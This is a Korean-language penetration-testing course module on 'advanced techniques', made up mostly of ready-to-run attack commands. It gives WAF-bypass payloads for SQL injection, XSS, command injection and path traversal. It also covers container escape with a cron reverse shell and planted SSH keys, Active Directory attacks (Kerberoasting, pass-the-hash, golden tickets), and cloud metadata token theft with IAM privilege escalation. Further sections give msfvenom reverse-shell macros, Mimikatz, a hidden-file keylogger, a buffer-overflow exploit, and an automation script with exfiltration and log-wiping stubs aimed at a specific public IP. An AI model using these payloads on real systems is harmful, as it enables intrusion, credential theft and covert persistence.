# Phase 9: 고급 기법 (Advanced Techniques)

## 개요
고급 침투 기법은 기본적인 공격이 차단된 환경에서 사용하는 우회 기술, 복잡한 공격 체인, 그리고 탐지 회피 기법을 포함합니다. WAF 우회, 컨테이너 탈출, 피벗팅 등을 다룹니다.

## 필수 도구
- Burp Suite Pro
- Metasploit Framework
- Docker
- Proxychains
- Chisel / Ligolo
- Custom exploit scripts

---

## 1. WAF/IDS 우회 기법

### 1.1 SQL Injection WAF 우회
```bash
# 기본 SQLi (차단됨)
' OR 1=1-- -

# 주석 우회
'/**/OR/**/1=1#
'/*!50000OR*/1=1#

# 대소문자 혼합
' Or 1=1-- -
' oR 1=1-- -

# URL 인코딩
%27%20OR%201=1--%20-

# Double URL 인코딩
%2527%2520OR%25201=1--%2520-

# 유니코드 우회
%u0027 OR 1=1-- -

# NULL 바이트
' OR 1=1%00-- -

# 공백 우회
'OR(1=1)-- -
'OR/**/1=1-- -
'OR%091=1-- -  # Tab
'OR%0D1=1-- -  # Carriage Return
'OR%0A1=1-- -  # Line Feed

# 괄호 우회
' OR (SELECT 1)=1-- -

# 시간 기반 우회 (느린 쿼리)
' AND SLEEP(5)-- -
' AND BENCHMARK(10000000,MD5('A'))-- -
```

### 1.2 XSS WAF 우회
```bash
# 기본 XSS (차단됨)
<script>alert(1)</script>

# 대소문자 혼합
<ScRiPt>alert(1)</ScRiPt>

# 인코딩
<script>alert(String.fromCharCode(88,83,83))</script>

# 이벤트 핸들러
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

# 필터 우회
<scr<script>ipt>alert(1)</scr</script>ipt>

# 유니코드 우회
<script>\u0061lert(1)</script>

# HTML 엔티티
<script>&#97;lert(1)</script>

# Base64
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

# 주석 삽입
<script>al<!--comment-->ert(1)</script>
```

### 1.3 Command Injection WAF 우회
```bash
# 기본 명령어 (차단됨)
; whoami

# 다양한 구분자
| whoami
|| whoami
& whoami
&& whoami
%0a whoami  # Newline

# 공백 우회
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 변수 확장
a=w;b=hoami;$a$b

# Base64 우회
echo d2hvYW1p | base64 -d | bash

# Hex 인코딩
echo -e "\x77\x68\x6f\x61\x6d\x69" | bash

# 역슬래시
w\h\o\a\m\i

# 와일드카드
/bin/c?t /etc/p?sswd
/???/??t /???/??ss??
```

### 1.4 Path Traversal WAF 우회
```bash
# 기본 경로 탐색 (차단됨)
../../etc/passwd

# URL 인코딩
..%2f..%2fetc%2fpasswd

# Double URL 인코딩
..%252f..%252fetc%252fpasswd

# 16비트 유니코드
..%c0%af..%c0%afetc%c0%afpasswd

# UTF-8 인코딩
..%c1%9c..%c1%9cetc%c1%9cpasswd

# 점 여러개
....//....//etc/passwd

# Null 바이트
../../etc/passwd%00

# 절대 경로 변환 우회
/var/www/../../etc/passwd
```

---

## 2. 컨테이너 탈출 (Container Escape)

### 2.1 Docker 권한 확인
```bash
# 컨테이너 내부인지 확인
cat /.dockerenv
ls -la /.dockerenv

# Cgroup 확인
cat /proc/1/cgroup | grep docker

# 권한 확인
capsh --print

# 호스트 프로세스 확인
ps aux
```

### 2.2 특권 컨테이너 탈출
```bash
# 특권 컨테이너인지 확인
ip link add dummy0 type dummy  # 성공하면 privileged

# 호스트 디스크 마운트
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 호스트 루트 파일시스템 접근
cd /mnt/host
chroot /mnt/host

# 호스트에 SSH 키 추가
echo "ssh-rsa AAAA..." >> /mnt/host/root/.ssh/authorized_keys

# 호스트 cron job 추가
echo "* * * * * root bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /mnt/host/etc/crontab
```

### 2.3 Docker Socket 탈출
```bash
# Docker socket 마운트 확인
ls -la /var/run/docker.sock

# Docker CLI 설치 (컨테이너 내부)
apk add docker-cli  # Alpine
apt-get install docker.io  # Debian

# 호스트에 특권 컨테이너 생성
docker -H unix:///var/run/docker.sock run -v /:/host -it --privileged alpine chroot /host

# 또는 기존 컨테이너에서 명령 실행
docker -H unix:///var/run/docker.sock exec <container_id> bash
```

### 2.4 Kubernetes 탈출
```bash
# Service Account 토큰 확인
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes API 접근
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 특권 Pod 생성
kubectl auth can-i create pods
kubectl run privileged-pod --image=alpine --privileged --restart=Never -- sh -c "chroot /host"
```

---

## 3. 피벗팅 (Pivoting) 및 터널링

### 3.1 SSH 터널링
```bash
# 로컬 포트 포워딩
ssh -L 8080:internal-server:80 user@jumphost

# 원격 포트 포워딩
ssh -R 9090:localhost:80 user@external-server

# 동적 포트 포워딩 (SOCKS 프록시)
ssh -D 1080 user@jumphost

# SOCKS 프록시 사용
proxychains curl http://internal-server/

# /etc/proxychains.conf
# socks5 127.0.0.1 1080
```

### 3.2 Chisel 터널링
```bash
# Chisel 서버 (공격자 머신)
./chisel server -p 8080 --reverse

# Chisel 클라이언트 (침해된 서버)
./chisel client YOUR_IP:8080 R:9090:internal-server:80

# SOCKS 프록시
./chisel client YOUR_IP:8080 R:socks

# 공격자 머신에서 사용
proxychains nmap -sT 192.168.1.0/24
```

### 3.3 Metasploit 피벗팅
```bash
# Meterpreter 세션에서
meterpreter> run autoroute -s 192.168.1.0/24

# 포트 포워딩
meterpreter> portfwd add -l 8080 -p 80 -r 192.168.1.10

# SOCKS 프록시
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> run -j

# Proxychains 설정 후
proxychains msfconsole
```

### 3.4 Socat 터널링
```bash
# 포트 리디렉션
socat TCP-LISTEN:8080,fork TCP:internal-server:80

# 암호화 터널
# 서버:
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork TCP:localhost:22

# 클라이언트:
socat TCP-LISTEN:2222,fork OPENSSL:jumphost:4443,verify=0
ssh -p 2222 localhost
```

---

## 4. 도메인 장악 (Active Directory)

### 4.1 정보 수집
```bash
# 도메인 정보
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.COM

# LDAP 쿼리
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "DC=domain,DC=com"

# BloodHound 데이터 수집
./SharpHound.exe -c All
./bloodhound-python -u user -p password -d domain.com -dc dc.domain.com -c All
```

### 4.2 Kerberoasting
```bash
# GetUserSPNs (Impacket)
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# 해시 크랙
hashcat -m 13100 -a 0 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### 4.3 AS-REP Roasting
```bash
# AS-REP 로스팅 가능한 사용자 확인
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat

# 해시 크랙
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 4.4 Pass-the-Hash
```bash
# Impacket psexec
python3 psexec.py -hashes :ntlm_hash administrator@192.168.1.10

# Impacket wmiexec
python3 wmiexec.py -hashes :ntlm_hash domain.com/administrator@192.168.1.10

# Impacket smbexec
python3 smbexec.py -hashes :ntlm_hash domain.com/administrator@192.168.1.10
```

### 4.5 Golden Ticket
```bash
# krbtgt 해시 획득 (도메인 관리자 권한 필요)
python3 secretsdump.py domain.com/administrator@dc.domain.com

# Golden Ticket 생성
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com administrator

# Ticket 사용
export KRB5CCNAME=administrator.ccache
python3 psexec.py administrator@dc.domain.com -k -no-pass
```

---

## 5. 클라우드 환경 공격

### 5.1 AWS 추가 공격
```bash
# Lambda 함수로 권한 상승
aws lambda list-functions
aws lambda get-function --function-name admin-function
aws lambda update-function-code --function-name target --zip-file fileb://malicious.zip

# EC2 메타데이터 v2 우회 시도
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# S3 버킷 열거
aws s3 ls
aws s3 ls s3://company-backups/

# IAM 권한 상승
aws iam attach-user-policy --user-name limited-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 5.2 Azure 공격
```bash
# Azure CLI 인증
az login
az account list

# VM 메타데이터
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 관리 ID 토큰 획득
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Storage 계정 키 추출
az storage account keys list --account-name companystore
```

### 5.3 GCP 공격
```bash
# GCP 메타데이터
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# 프로젝트 정보
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# gcloud 인증
gcloud auth list
gcloud config list
```

---

## 6. 무선 네트워크 공격

### 6.1 WiFi 크랙킹
```bash
# 무선 인터페이스 모니터 모드
airmon-ng start wlan0

# 네트워크 스캔
airodump-ng wlan0mon

# 특정 AP 캡처
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth 공격 (handshake 강제)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# WPA 해시 크랙
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Hashcat으로 크랙
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```

### 6.2 Evil Twin 공격
```bash
# hostapd 설정
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=CompanyWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
EOF

# Evil AP 시작
hostapd hostapd.conf

# DHCP 서버
dnsmasq -C dnsmasq.conf -d

# 트래픽 캡처
tcpdump -i wlan0 -w evil_twin.pcap
```

---

## 7. 소셜 엔지니어링

### 7.1 피싱 페이지 생성
```bash
# Social Engineering Toolkit (SET)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Gophish (고급 피싱 프레임워크)
./gophish
# https://localhost:3333
```

### 7.2 악성 문서 생성
```bash
# Metasploit 매크로 생성
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f vba -o macro.vba

# Word 문서에 매크로 삽입
# Developer -> Visual Basic -> Insert Module -> 매크로 붙여넣기

# PDF 악성 페이로드
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o payload.exe
# PDF에 embed (Adobe Reader 취약점 활용)
```

---

## 8. 포스트 익스플로잇 (Post-Exploitation)

### 8.1 메모리 덤프 및 분석
```bash
# Linux 메모리 덤프
dd if=/dev/mem of=/tmp/memory.dump bs=1M

# 프로세스 메모리 덤프
gcore -o /tmp/process_dump <PID>

# Mimikatz (Windows)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### 8.2 스크린샷 캡처
```bash
# Linux 스크린샷
DISPLAY=:0 xwd -root -out screenshot.xwd
convert screenshot.xwd screenshot.png

# 자동 스크린샷 (매 5분)
while true; do
    DISPLAY=:0 import -window root /tmp/$(date +%s).png
    sleep 300
done
```

### 8.3 키로거
```bash
# Python 키로거
cat > keylogger.py << 'EOF'
from pynput import keyboard

def on_press(key):
    with open('/tmp/.keylog.txt', 'a') as f:
        f.write(f'{key}\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

python3 keylogger.py &
```

---

## 9. 제로데이 개발 기초

### 9.1 버퍼 오버플로우 (간단한 예)
```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 취약점
    printf("Input: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

// 컴파일 (ASLR/DEP 비활성화)
gcc -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable

// 익스플로잇
python3 -c "print('A' * 72 + '\xef\xbe\xad\xde')" | ./vulnerable
```

### 9.2 Fuzzing
```bash
# AFL (American Fuzzy Lop)
afl-gcc vulnerable.c -o vulnerable
afl-fuzz -i testcases -o findings ./vulnerable @@

# Radamsa
radamsa sample_input.txt > fuzzed_input.txt
./vulnerable < fuzzed_input.txt
```

---

## 10. 자동화 및 통합

### 10.1 완전 자동 침투 프레임워크
```python
#!/usr/bin/env python3
# advanced_auto_pentest.py

import nmap
import requests
from sqlmap import sqlmap
import paramiko
from concurrent.futures import ThreadPoolExecutor

class AdvancedPentest:
    def __init__(self, target):
        self.target = target
        self.results = {}

    def scan_ports(self):
        nm = nmap.PortScanner()
        nm.scan(self.target, '1-65535', '-sS -sV')
        self.results['ports'] = nm[self.target]

    def web_scan(self):
        # SQL Injection 자동 탐지
        # XSS 자동 탐지
        # Directory bruteforce
        pass

    def exploit_vulnerabilities(self):
        # 발견된 취약점 자동 익스플로잇
        pass

    def privilege_escalation(self):
        # LinPEAS 자동 실행
        # 발견된 경로로 권한 상승 시도
        pass

    def exfiltrate_data(self):
        # DB 자동 덤프
        # 중요 파일 자동 추출
        pass

    def cover_tracks(self):
        # 로그 자동 정리
        pass

    def run_full_pentest(self):
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.submit(self.scan_ports)
            executor.submit(self.web_scan)
            executor.submit(self.exploit_vulnerabilities)
            executor.submit(self.privilege_escalation)
            executor.submit(self.exfiltrate_data)
            executor.submit(self.cover_tracks)

if __name__ == "__main__":
    pentest = AdvancedPentest("3.35.218.180")
    pentest.run_full_pentest()
```

---

## 핵심 정리

1. WAF 우회 - 인코딩, 난독화, 우회 문자 사용
2. 컨테이너 탈출 - 권한 확인 후 호스트 파일시스템 접근
3. 피벗팅 - SSH, Chisel, Metasploit로 내부 네트워크 접근
4. AD 공격 - Kerberoasting, Pass-the-Hash로 도메인 장악
5. 클라우드 - IMDS, 서비스별 API 악용

## 다음 단계
Phase 10: 완전 자동화 스크립트로 모든 단계를 통합한 침투 도구 작성
